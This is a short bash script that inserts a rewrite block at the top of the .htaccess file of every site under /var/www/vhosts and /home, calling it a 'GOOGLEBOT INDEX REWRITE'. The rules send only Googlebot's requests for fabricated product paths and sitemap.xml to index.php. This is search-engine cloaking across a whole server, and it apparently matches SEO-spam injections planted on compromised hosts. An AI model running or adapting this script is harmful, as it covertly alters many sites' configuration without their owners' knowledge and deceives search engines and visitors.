#!/usr/bin/env bash
set -euo pipefail

TARGET_GLOBS=(
    "/var/www/vhosts/*/www"
    "/home/*/www"
)

BLOCK_START="# BEGIN GOOGLEBOT INDEX REWRITE"

RULE_BLOCK=$(cat <<'EOF'
# BEGIN GOOGLEBOT INDEX REWRITE
<IfModule mod_rewrite.c>
RewriteEngine On

RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
RewriteRule ^t[0-9]+/product/[^/]+/?$ index.php [L,QSA]

RewriteCond %{HTTP_USER_AGENT} Googlebot [NC]
RewriteRule ^sitemap\.xml$ index.php [L,QSA]
</IfModule>
# END GOOGLEBOT INDEX REWRITE
EOF
)

process_target_dir() {
    local target_dir="$1"
    local htaccess_path="${target_dir%/}/.htaccess"
    local temp_file=""

    mkdir -p "$target_dir"

    if [[ -f "$htaccess_path" ]] && grep -Fq "$BLOCK_START" "$htaccess_path"; then
        echo "Managed rewrite block already exists: $htaccess_path"
        return 0
    fi

    temp_file="$(mktemp)"

    if [[ -f "$htaccess_path" ]]; then
        {
            printf '%s\n\n' "$RULE_BLOCK"
            cat "$htaccess_path"
        } > "$temp_file"
        mv "$temp_file" "$htaccess_path"
        echo "Prepended managed rewrite block to: $htaccess_path"
    else
        printf '%s\n' "$RULE_BLOCK" > "$htaccess_path"
        echo "Created htaccess file: $htaccess_path"
    fi

    rm -f "$temp_file"
}

shopt -s nullglob
target_dirs=()
for glob_pattern in "${TARGET_GLOBS[@]}"; do
    target_dirs+=($glob_pattern)
done
shopt -u nullglob

if [[ ${#target_dirs[@]} -eq 0 ]]; then
    echo "No matching directories found for any of the configured patterns."
    exit 0
fi

for target_dir in "${target_dirs[@]}"; do
    process_target_dir "$target_dir"
done
